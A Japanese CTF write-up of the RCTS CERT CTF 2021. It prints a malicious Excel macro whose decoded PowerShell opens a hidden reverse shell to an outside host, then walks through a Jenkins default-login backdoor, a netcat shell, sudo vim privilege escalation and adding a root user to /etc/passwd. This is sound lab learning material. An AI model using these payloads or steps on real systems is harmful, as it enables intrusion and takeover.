---
title: "RCTS CERT CTF 2021 Writeup"
date: 2021-08-13T18:00:00+09:00
lastmod: 2021-08-13T18:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Frcts_cert_ctf_2021%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://defendingthesoc.ctf.cert.rcts.pt/challenges](https://defendingthesoc.ctf.cert.rcts.pt/challenges)
<br /><br />
年休を取った日にちょうどやってたCTFに参加しました。簡単なのも多かったけど、VMを使ったチャレンジとかがあって結構楽しかったし、勉強にもなったので参加できてよかったです。

<br />

1700点を獲得し、66位でした。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Score1.png" alt="rcts_cert_CTF_2021_Score1.png">

<br><br>

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Score2.png" alt="rcts_cert_CTF_2021_Score2.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Score3.png" alt="rcts_cert_CTF_2021_Score3.png">


<br><br>
以下、チャレンジのリストです。オレンジのは大会中に出てきてたもの、グリーンのはアンロックできてなくて大会中には出てきてなかったチャレンジです。。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Chall1.png" alt="rcts_cert_CTF_2021_Chall1.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Chall2.png" alt="rcts_cert_CTF_2021_Chall2.png">

<br>

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Chall3.png" alt="rcts_cert_CTF_2021_Chall3.png">


<br>



<br /><br />
## [Mission]: Decrypting the payload (100 points)
- - -
### Challenge
> We need to know how the attacker gained access to our network.
<br /><br />
The team discovered that some of our employees where targeted by a phishing attempt and got this excel file from their emails.
<br /><br />
Can you check if this was used to gain a foothold in our network?

Attachment:

- Account_report.xlsm


<br />

### Solution
ファイル・タイプは以下の通り。

<pre>
$ file Account_report.xlsm
Account_report.xlsm: Microsoft Excel 2007+
</pre>

<br />
olevbaでマクロが確認できます。

<pre>
$ olevba Account_report.xlsm
olevba 0.56.2 on Python 2.7.18 - http://decalage.info/python/oletools
===============================================================================
FILE: Account_report.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: xl/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Rem Attribute VBA_ModuleType=VBAModule
Sub Auto_Open()
Dim aeythrpom As String
Dim vultiormen As String
Dim moabehina As String
Dim hujilkomna As String
Dim tuabnimne As String
Dim wuotamw As String
Dim sjeldmajek As String
Dim afsyedlmen As String
Dim eujrtabem As String
aeythrpom = ytahenomter("706f7765727368656c6c2e657865202d6578656320627970617373202d6e6f65786974202d772068696464656e202d656e6320204a41423041434141505141674143634157774245414777416241424a4147304163414276414849416441416f414677414967423141484d") & _
ytahenomter("415a51427941444d414d674175414751416241427341467741496741704146304149414277414855415967427341476b415977416741484d") & _
ytahenomter("4164414268414851416151426a414341415a514234414851415a51427941473441494142694147384162774273414341415577426f414738416477425841476b416267426b414738416477416f41476b41626742304143414161414268414734415a414273414755414c41416741476b41626742304143414163774230414745416441426c41436b41") & _
ytahenomter("4f77416e414473414451414b414745415a41426b4143304164414235414841415a5141674143304162674268414730415a5141674148634161514275414341414c5142744147554162514269414755416367416741435141644141674143304162674268414730415a51427a414841415951426a41475541494142754147454164414270414859415a51413741467341626742684148514161514232414755414c67423341476b416267426441446f414f674254414767416277423341466341615142754147514162774233414367414b41426241464d") & _
ytahenomter("416551427a414851415a5142744143344152414270414745415a774275414738416377423041476b415977427a4143344155414279414738415977426c41484d")
vultiormen = ytahenomter("416377426441446f414f674248414755416441424441485541636742794147554162674230414641416367427641474d") & ytahenomter("415a51427a41484d414b4141704143414166414167414563415a5142304143304155414279414738415977426c41484d") & _
ytahenomter("4163774170414334415451426841476b416267425841476b416267426b4147384164774249414745416267426b414777415a514173414341414d") & _
ytahenomter("414170414473414451414b41476b415a514234414341414b41416741467341557742304148494161514275414563415851413641446f416167427641476b416267416f414363414a774173414341414b4142624148494152514248414755415741426441446f414f67424e414745415641426a414767415a514254414367414941416941436b414941416e414867414a774172414630414d") & _
ytahenomter("774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d") & ytahenomter("774178414673415241424a414777415441426c414567416377416b41437341585141784146734152414270414577415441426c414767416377416b414341414b41416d4148774149414170414451414d")
moabehina = ytahenomter("774264414649415151426f41474d4157774264414563416267424a414649415641427a414673414c41416e4148514157414271414363414b41426c41474d415151424d") & ytahenomter("4146414152514253414334414b51416e414351414a774173414363416477427841476b414a77416f41475541517742424145774155414246414649414c674170414363414f774230414667414a774172414363416167427a41474d") & _
ytahenomter("414d41426b414638415a41417a4147774159674130414734414d") & _
ytahenomter("774266414441416367426a414451416251416e414373414a774237414763414a774172414363415951416e414373414a774273414759416441425941476f414941416e414373414a774139414445415877426e414745414a774172414363416241426d4148634163514270414363414b414169414377414a774175414363414c414167414363415567416e414373414a77427041456341534142554148514154774273414363414b77416e414755415a674230414363414941417041434141664141674147594162774279414555415151426a414567414c514276414549415367426c41474d") & _
ytahenomter("4156414167414873414a41426641433441566742424145774156514246414830414941417041436b4149414170414473414451414b41464d") & _
ytahenomter("4152514230414341414b414169414563414f414169414373414967426f414349414b5141674143674149414169414341414b51416741436b414e67417a41463041556742684147674159774262414377414a774279414745415767416e4145554159774268414777415541426c414649414c514167414451414d")
hujilkomna = ytahenomter("774264414649415951426f41474d415777417341436b414d") & ytahenomter("41413141463041556742684147674159774262414373414f41413341463041556742684147674159774262414373414f5141304146304155674268414767415977426241436741494141674147554151774242414777416341424641464941597741744143414149414170414363414f774179414363414b77416e414534414a774172414363414d") & _
ytahenomter("51416e414373414a77423941484d4164514177414849414d77426e414363414b77416e414734414e41426b414638414d774279414451414a7741724143634158774179414534414d") & _
ytahenomter("5141674144304149414179414638415a774268414363414b77416e414777415a674279414363414b77416e414745415767416e414367414b4141674143674149414170414363414a77427541476b4154774271414330414a774234414363414b77426441444d")
tuabnimne = ytahenomter("414c414178414673414b51416f414563415467427041484941564142544147384164414175414555415977424f414755416367426c414559415a514253414841415251427a4145384151674253414555416467416b414341414b41416741433441494141694143414149414170414341414f77417441476f415477424a414734414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d") & _
ytahenomter("414855415a514262414341414c514167414445414c674175414341414c514167414367414941416f4143414162414254414341414b4141694146594151514253414349414b77416941456b4159514243414349414b77416941457741525141364147634149674172414349414f414249414349414b514167414341414b514175414659415151424d") & _
ytahenomter("414855415a514175414577415a514275414763416441424941436b4158514167414877414941424a414755415741414e41416f414a4142774147454165514273414738415951426b414341415051416741434941536742424145494161674242414563416477424241474541555142434147774151514248414451415151426b414545415151426e414545415241417741454541535142424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d") & _
ytahenomter("41424241454d415151424241465541647742434144554151514249414530415151426b41454541516742734145454152774177414545415441426e414549415477424241456341565142424147514151514242414855415151424741453041515142694148634151674271414545415277427a4145454157674252414549414d") & _
ytahenomter("4142424145674154514242414577415a774243414655415151424641453041515142564145454151674245414545415277423341454541595142524145494162414242414563414e4142424147514151514242414738415151424441456b415151424e4146454151514131414545415241424a414545415441426e414545416477424241454d")
wuotamw = ytahenomter("414e414242414530415a7742424148554151514245414555415151424e4148634151514235414545415177424a4145454154414242414545414d") & ytahenomter("41424241455141555142424145304164774242414841415151424541484d") & _
ytahenomter("415151424b41454541516742364145454153414252414545415977426e4145494162414242414563415251424241474941555142424147634151514245414441415151424a4145454151514272414545415277424e414545415967424241454941634142424145634156514242414749415a77424341444141515142444144514151514253414863415167427341454541534142524145454156514233414549414d") & _
ytahenomter("414242414567415351424241466f41555142434147674151514248414441415151424c4145454151514277414545415241427a4145454156774233414549416151424241456741617742424147514151514243414777415151424741484d") & _
ytahenomter("4151514259414645415167426b4145454151774252414545415751426e414549414e514242414567415551424241466f415551424341486f41515142444145454151514251414645415151426e4145454152414242414545415441426e4145454164514242414551415751424241453441555142424144454151514245414530415151424f41464541516741344145454151774256414545415a5142334145454164774242414567414d") & ytahenomter("414242414538416477424341444d")
sjeldmajek = ytahenomter("41515142484147634151514268414645415167427a41454541527742564145454153774242414545416277424241454d") & _
ytahenomter("415551424241474541555142424147634151514245414441415151424a4145454151514272414545415341424e414545415a4142424145494165514242414563415651424241466b415551424341485141515142444144514151514256414763415167427341454541527742464145454157674242414545416277424241454d") & _
ytahenomter("415551424241466b415a77424341445541515142494146454151514261414645415167423641454541517742334145454153514242414545416477424241454d") & _
ytahenomter("416477424241456b4151514242414773415151424841456b415151426c4146454151674177414545415277425641454541597742334145454164514242414555416477424241466f4155514243414855415151424841474d") & ytahenomter("415151426b414545415167427641454541517742724145454153774252414545415a77424241454d414d") & _
ytahenomter("414242414749415a7742434147774151514244414545415151424e4145454151514277414545415341427a41454541547742334145454161774242414563415551424241466b41555142434144414151514248414555415151424a4145454151514135414545415177424241454541537742424145494154774242414563415651424241475141647742424148514151514246414467415151425a414763415167427841454541527742564145454157514233414549414d")
afsyedlmen = ytahenomter("41424241454d415151424241457741555142434146554151514249414773415151426a4145454151674273414545415251413041454541575142524145494164414242414563415651424241456b41515142434146514151514249414773415151426a4148634151674177414545415277425641454541596742524145454164514242414559415551424241466f41555142434144514151514249414645415151424d") & ytahenomter("4147634151674243414545415267424e41454541555142334145494153674242414555416177424241464941555142434148554151514248414530415151426941486341516742724145454152774272414545415967426e414549416267424241454d") & _
ytahenomter("4161774242414577415a7742434145674151514248414655415151426b41454541516742554145454153414252414545415977426e4145494163414242414563414e41424241466f41647742424147384151514244414645415151425a414763415167413141454541534142524145454157674252414549416567424241454d") & _
ytahenomter("4164774242414530415151424241484d4151514244414545415151424b4145454151674277414545415177427241454541547742334145454161774242414567415451424241466f41555142434148554151514248414645415151425a414763415167426f414545415277424e4145454159514233414545415a774242414551414d") & _
ytahenomter("41424241456b4151514242414738415151424841477341515142614146454151674130414545415177424241454541536742424145494161774242414563415251424241475141515142434147674151514244414545415151424e4147634151514172414545415177425a4145454154514252414545415a774242414567416477424241456b41515142434146414151514249414655415151426b4145454151514230414545415267424e414545415a41424241454941655142424145634161774242414749415a7742434147344151514244414545415151424c4146454151514133414545415177425241454541597742334145494162414242414563414e41424241466f415151424341476b4151514248414555415151425a4148634151674279414545415241424a4145454153514242414545415a774242414551414d") & _
ytahenomter("41424241456b41515142424147734151514249414530415151426141464541516742314145454152774252414545415751426e414549416141424241456341545142424147454164774242414763415151424441484d") & _
ytahenomter("415151424a414545415151427041454541526742424145454156514233414545415a77424241454d415351424241456b41515142424148494151514244414545415151424c4145454151674233414545415341426a4145454157674242414545416341424241454d") & _
ytahenomter("414e414242414655415151424341476741515142494146454151514268414545415151426e414545415177427a41454541535142424145454161514242414551414e41424241456b415151424241476b415151424541484d") & _
ytahenomter("415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424a4145454151514135414545415177424241454541537742424145494159674242414567415551424241466f41555142434144514151514249414645415151424d")
eujrtabem = ytahenomter("414763415167427341454541527741304145454157514233414549416467424241456341555142424147454155514243414855415151424841474d") & ytahenomter("41515142594146454151514132414545415241427641454541555142524145494156414242414555415451424241464d") & _
ytahenomter("415551424341456f4151514244414773415151424d") & _
ytahenomter("41476341516742494145454152774256414545415a4142424145494151774242414567416177424241475141515142434147774151514249414530415151424c4145454151514272414545415341424e41454541576742524145494164514242414563415551424241466b415a7742434147674151514248414530415151426841486341515142354145454151774272414545415477423341454541617742424145674154514242414751415151424341486b4151514248414655415151425a4146454151674230414545415177413041454541566742334145494165514242414563416177424241475141515142434147774151514244414763415151424b41454541516742364145454152774256414545415967426e4145494161774242414563415351424241475541555142434144414151514248414655415151424d") & _
ytahenomter("41454541515142334145454151774233414545415367424241454941656742424145634156514242414749415a774243414773415151424841456b415151426c41464541516741774145454152774256414545415441426e41454941545142424145634156514242414749415a774243414734415151424941464541515142684145454151514277414545415241427a41454541536742424145494165674242414567415551424241474d") & _
ytahenomter("415a774243414777415151424841455541515142694146454151514231414545415251425a4145454159674242414549414d") & ytahenomter("514242414567415451424241474541515142424147384151514244414773415151426d4146454151514133414545415177425241454541575142334145494163774242414563416177424241466f41555142434148554151514249414645415151424d") & _
ytahenomter("414763415167424541454541527742334145454159674233414549416567424241456341565142424145734151514242414841415151424541484d") & ytahenomter("4151514169414130414367416b41474d") & _
ytahenomter("4149414139414341415777425441486b41637742304147554162514175414651415a514234414851414c67424641473441597742764147514161514275414763415851413641446f415651427541476b4159774276414751415a514175414563415a51423041464d") & ytahenomter("416441427941476b416267426e414367415777425441486b4163774230414755416251417541454d") & _
ytahenomter("4162774275414859415a514279414851415851413641446f41526742794147384162514243414745416377426c414459414e4142544148514163674270414734415a77416f414351416341426841486b4162414276414745415a41417041436b414451414b41476b415a674167414367414a4142774147454165514273414738415951426b414341414c514274414745416441426a41476741494141694147674164414230414841414f67423841476741644142304148414163774136414349414b514167414873414451414b4143414149414167414341414a4142774147454165514273414738415951426b4143414150514167414367415467426c414863414c514250414749416167426c41474d") & _
ytahenomter("4164414167414349415467426c414851414c674258414755415967426a414777416151426c414734416441416941436b414c6742454147384164774275414777416277426841475141557742304148494161514275414763414b41416b41484141595142354147774162774268414751414b514137414130414367423941413041436742704147554165414167414351415977413741413d3d")
x = Shell(aeythrpom & vultiormen & moabehina & hujilkomna & tuabnimne & wuotamw & sjeldmajek & afsyedlmen & eujrtabem)
End Sub
Private Function ytahenomter(ByVal ncjdmileoa As String) As String
Dim bycamliooa As Long
For bycamliooa = 1 To Len(ncjdmileoa) Step 2
ytahenomter = ytahenomter & Chr$(Val("&H" & Mid$(ncjdmileoa, bycamliooa, 2)))
Next bycamliooa
End Function

...(snip)...
</pre>


<br />

Libre Officeなどで開いても確認できます。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_Libre.png" alt="rcts_cert_CTF_2021_Libre.png">


<br />

デコードすると、Shell関数の引数には、`powershell.exe -exec bypass -noexit -w hidden -enc <データ>` となっており、データ部分をデコードすると以下になります。ここで、黄色でハイライトした部分にフラグっぽい文字列があるのがわかります。ここからフラグが取れるので、Windowsマシンでの実行は不要です。

{{< highlight powershell "linenos=table,hl_lines=5 7" >}}
$t = '[DllImport(\"user32dll\")] public static extern bool ShowWindow(int handle, int state);';

add-type -name win -member $t -namespace native;[nativewin]::ShowWindow(([SystemDiagnosticsProcess]::GetCurrentProcess() | Get-Process)MainWindowHandle, 0);

iex ( [StrinG]::join('', ([rEGeX]::MaTcheS( ") 'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )431[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(ecALPER)'$','wqi'(eCALPER)';tX'+'jsc0d_d3lb4n3_0rc4m'+'{g'+'a'+'lftXj '+'=1_ga'+'lfwqi'(",'', 'R'+'iGHTtOl'+'eft' ) | forEAcH-oBJecT {$_VALUE} )) );

SEt ("G8"+"h") ( " ) )63]Rahc[,'raZ'EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}su0r3g'+'n4d_3r4'+'_2N1 = 2_ga'+'lfr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSotEcNereFeRpEsOBREv$ (  "  ) ;-jOIn ( lS ("VAR"+"IaB"+"LE:g"+"8H")  )VALue[ - 1 - ( ( lS ("VAR"+"IaB"+"LE:g"+"8H")  )VALueLengtH)] | IeX

$payload = "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMwAyACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApADsA"

$c = [SystemTextEncoding]::UnicodeGetString([SystemConvert]::FromBase64String($payload))

if ($payload -match "http:|https:") {

   $payload = (New-Object "NetWebclient")DownloadString($payload);

}

iex $c;

{{< / highlight >}}

<br />

`'R'+'iGHTtOl'+'eft'` (RightToLeft) があったり、`ecALPER` (Replace) のような反転された文字列があるので、Pythonで `[::-1]` を付けて一旦反転してみるともう少し見えてきます。（echo と rev でも反転できます。）

<pre>
$ python3

>>> ") 'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )431[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(ecALPER)'$','wqi'(eCALPER)';tX'+'jsc0d_d3lb4n3_0rc4m'+'{g'+'a'+'lftXj '+'=1_ga'+'lfwqi'("[::-1]
"('iqwfl'+'ag_1='+' jXtfl'+'a'+'g{'+'m4cr0_3n4bl3d_d0csj'+'Xt;')REPLACe('iqw','$')REPLAce('jXt',[sTRInG][chAR]34) |&( $sheLLiD[1]+$sHeLlID[134) |&( $sheLLiD[1]+$sHeLlID[13]+'x' )"

>>> " ) )63]Rahc[,'raZ'EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[(  eCAlpERc-  )';2'+'N'+'1'+'}su0r3g'+'n4d_3r4'+'_2N1 = 2_ga'+'lfr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSotEcNereFeRpEsOBREv$ (  "[::-1]
"  ( $vERBOsEpReFereNcEtoSTriNG()[1,3]+'x'-jOin'') ( (('Za'+'rfl'+'ag_2 = 1N2_'+'4r3_d4n'+'g3r0us}'+'1'+'N'+'2;')  -cREplACe  ([chaR]49+[chaR]78+[chaR]50),[chaR]34 -RePlacE'Zar',[chaR]36) ) "
</pre>

<br />
ちなみに、どの部分を反転させるのかは、色付きのエディタとかで見るとわかりやすいと思います。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_emacs.png" alt="rcts_cert_CTF_2021_emacs.png">


<br /><br />

文字列のReplaceや連結をすると、フラグは以下になります。

Flag: `flag{m4cr0_3n4bl3d_d0cs_4r3_d4ng3r0us}`




<br /><br />
<br /><br />
## [Mission]: Something Suspicious (100 points)
- - -
### Challenge
> We have detected a strange activity inside our network and manage to get some logs from it.
<br /><br />
Can you see what happened and if there was a host compromised?

Attachment:

- ftp.log （147行のログ）
- ssh.log （301行のログ）


<br />

### Solution
ログの中から怪しいところを見つけるチャレンジです。

ftp.log
{{< highlight c "linenos=table,hl_lines=8" >}}
...(snip)...
Fri Jun 25 03:52:03 2021 [pid 2] CONNECT: Client "192.168.1.23"
Fri Jun 25 03:52:03 2021 [pid 2] CONNECT: Client "192.168.1.23"
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "04345678"
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "daniel"
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "abc043"
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "nicole"
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "ZmxhZ3tzMG0zdGgxbmc="
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "rockyou"
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "0434567"
Fri Jun 25 03:52:03 2021 [pid 1] [ftp] OK LOGIN: Client "192.168.1.23", anon password "043456789"
...(snip)...
{{< / highlight >}}

<br>

ssh.log
{{< highlight c "linenos=table,hl_lines=5" >}}
...(snip)...
Jun 25 00:38:05 lockedout auth.err getty[2955]: tcgetattr: I/O error^M
Jun 25 00:49:05 lockedout auth.err getty[3028]: tcgetattr: I/O error^M
Jun 25 00:49:14 lockedout auth.info sshd[3029]: Connection from 192.168.1.23 port 53522 on 192.168.1.7 port 22 rdomain ""
Jun 25 00:49:14 lockedout auth.info sshd[3029]: Invalid user X3N1c3AxYzEwdXN9 from 192.168.1.23 port 53522
Jun 25 00:49:15 lockedout daemon.info init: process '/sbin/getty -L 0 ttyS0 vt100' (pid 3028) exited. Scheduling for restart.
Jun 25 00:49:16 lockedout auth.err sshd[3029]: error: Could not get shadow information for NOUSER
Jun 25 00:49:16 lockedout auth.info sshd[3029]: Failed password for invalid user X3N1c3AxYzEwdXN9 from 192.168.1.23 port 53522 ssh2
Jun 25 00:49:16 lockedout daemon.info init: starting pid 3031, tty '/dev/ttyS0': '/sbin/getty -L 0 ttyS0 vt100'
Jun 25 00:49:16 lockedout auth.err getty[3031]: tcgetattr: I/O error^M
...(snip)...
{{< / highlight >}}


<br />

<pre>
$ echo ZmxhZ3tzMG0zdGgxbmc= | base64 -d
flag{s0m3th1ng

$ echo X3N1c3AxYzEwdXN9 | base64 -d ; echo
_susp1c10us}
</pre>

<br />

Flag: `flag{s0m3th1ng_susp1c10us}`




<br /><br />
<br /><br />
## [Mission]: Locked outside (100 points)
- - -
### Challenge
> Based on the payload discovered, the employee’s computer was used to compromise a machine in our network.
<br /><br />
We checked the machine and confirmed that we’ve lost SSH access to it.
<br /><br />
Can you check if we can get the access back?

Attachment:

- lockedout.ova


<br />

### Solution
まずは nmap で空いているポートを確認します。

<pre>
$ ports=$(nmap -p- --min-rate=1000 -T4 192.168.0.213 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
$ nmap -p$ports -sC -sV 192.168.0.213
Starting Nmap 7.92 ( https://nmap.org ) at 2021-08-13 04:02 +08
Nmap scan report for 192.168.0.213
Host is up (0.00099s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.0.130
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        21            129 Jun 22 09:50 note.txt
22/tcp   open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey:
|   3072 38:08:fc:0d:8a:8a:f8:ea:fb:4d:6c:af:1d:22:e1:ff (RSA)
|   256 2d:d7:bf:a1:62:58:18:d9:80:e7:7c:15:c6:d6:32:64 (ECDSA)
|_  256 34:7a:7e:dd:ba:a7:be:d7:3c:0e:9b:5a:73:cb:86:cb (ED25519)
8080/tcp open  http    Jetty 9.4.39.v20210325
|_http-server-header: Jetty(9.4.39.v20210325)
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.67 seconds
</pre>

- Anonymous FTPができる。
- SSHはopenだけど、チャレンジ内容からSSHはできない。
- 8080にて、Jenkinsが動いている。

<br>

まずは、ftp & sshを確認します。rootのSSHパスワードをメモしたファイルが見つかりますが、ログインはできません。

<pre>
$ ftp 192.168.0.213
Connected to 192.168.0.213.
220 (vsFTPd 3.0.3)
Name (192.168.0.213:captureamerica): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        21            129 Jun 22 09:50 note.txt
226 Directory send OK.

ftp> get note.txt -
remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (129 bytes).
# Jenkins Development Server
# This is a development server
# default credentials - ssh
# username: root
# password: alpine_r00t
226 Transfer complete.
129 bytes received in 0.00 secs (144.8006 kB/s)

ftp> bye
221 Goodbye.

$ ssh root@192.168.0.213
root@192.168.0.213's password:
Permission denied, please try again.
</pre>

<br>

Jenkinsは攻撃によく使われるやつなので、とっかかりはこっちが正解です。admin / admin で入れます。

New Item -> Freestyle project で、backdoorをしかけます。

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_jenkins1.png" alt="rcts_cert_CTF_2021_jenkins1.png">

<br />

<img src="https://captureamerica.github.io/writeups/img/rcts_cert_CTF_2021_jenkins2.png" alt="rcts_cert_CTF_2021_jenkins2.png">

<br />

Raw Shellの中、Python3と/bin/ashを使ってterminalを設定します。(ちなみに、/bin/bashはありませんでした。)

<pre>
$ nc 192.168.0.213 4444
id
uid=100(jenkins) gid=101(jenkins) groups=101(jenkins),101(jenkins)

sudo -l
User jenkins may run the following commands on lockedout:
    (root) NOPASSWD: /usr/bin/vim

which python

which python3
/usr/bin/python3

python3 -c 'import pty; pty.spawn("/bin/ash");'

~/workspace/RCTS_CTF $ ^[[24;24R

export TERM=xterm

（ここでCTRL-Z）

stty raw -echo
fg
reset

</pre>


<br />

GTFOBins（[https://gtfobins.github.io/gtfobins/vim/](https://gtfobins.github.io/gtfobins/vim/)）に従って、権限昇格してみます。

<pre>
sudo /usr/bin/vim -c ':!/bin/ash'

:!/bin/ash
/var/lib/jenkins/workspace/RCTS_CTF #
id
uid=0(root2) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)python3 -c import pty; pty.spawn("/bin/sh"); 

$

</pre>


<br />
その他、/etc/passwd に別のrootユーザを追加するやり方でもroot権限は取れます。なお、Raw shellでうまくファイル編集ができない場合は、以下のようにvimの引数を使う方法もあります。そうすると編集が終わった状態で立ち上がります。

<pre>
sudo /usr/bin/vim /etc/passwd +"a|root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/sh"

su root2
Password:
# id
uid=0(root2) gid=0(root) groups=0(root)

</pre>

<br />
これでroot2としてSSHログインもできると思ったんですが、どうもログインできないので、SSHの設定どうなっているんだと思って sshd_config を確認することにしました。

<pre>
cat /etc/ssh/sshd_config

...(snip)...

## disabled the only access they have
## l33t h4x0r!
#PermitRootLogin yes
# flag{r00t_l0gin_1s_1ns3cur3}

...(snip)...
</pre>

あー、Root Loginは無効になっているのね。てか、フラグ見つかったし。。。

<br />

Flag: `flag{r00t_l0gin_1s_1ns3cur3}`



<br /><br />
<br /><br />
## [Network]: Changing our locks and dumping old keys (100 points)
- - -
### Challenge
> There should be something in the server that was used to maintain persistence.
<br /><br />
Can you track this one and find more information about the attacker?

<br />

### Solution
（これは、イベント中に解けなかったやつです。）

`maintain persistence` と書かれていたので、cronで動く何かだと思ったんですよね。

